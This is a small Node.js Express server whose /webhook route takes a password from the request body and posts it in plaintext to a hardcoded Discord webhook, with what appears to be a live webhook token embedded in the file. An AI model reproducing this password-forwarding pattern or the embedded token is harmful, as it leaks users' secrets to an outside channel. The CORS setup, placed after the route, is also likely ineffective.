const express = require('express');
const app = express();
const bodyParser = require('body-parser');
const fetch = require('node-fetch');  // Ensure you have 'node-fetch' installed for making requests

app.use(bodyParser.json()); // Parse JSON bodies

// This is the route that will handle the POST request to /webhook
app.post('/webhook', (req, res) => {
    const { password } = req.body;  // Get the password from the request body

    if (!password) {
        return res.status(400).send('Password is missing');
    }

    const webhookUrl = 'https://discord.com/api/webhooks/1339836003552071720/zP_2Iu8Nk7AIdo5LlCJSkMDCnsig8GNiUXy3KFF-tMXUNdALCVxIAjz_UYjN-tMpI1eq';  // Replace with your actual webhook URL

    // Prepare the data to send to Discord
    const webhookData = {
        content: `New generated password: **${password}**`  // Send the password in the message content
    };

    // Send the data to the Discord webhook URL
    fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(webhookData)  // Convert the data to JSON before sending
    })
    .then(response => response.json())
    .then(data => {
        console.log("Password sent to Discord!");
        res.status(200).send('Message sent to Discord');
    })
    .catch(error => {
        console.error('Error:', error);
        res.status(500).send('Error sending message to Discord');
    });
});

app.listen(3000, () => {
    console.log('Server running on port 3000');
});

const cors = require('cors');
app.use(cors());  // Enable CORS if needed (to allow cross-origin requests)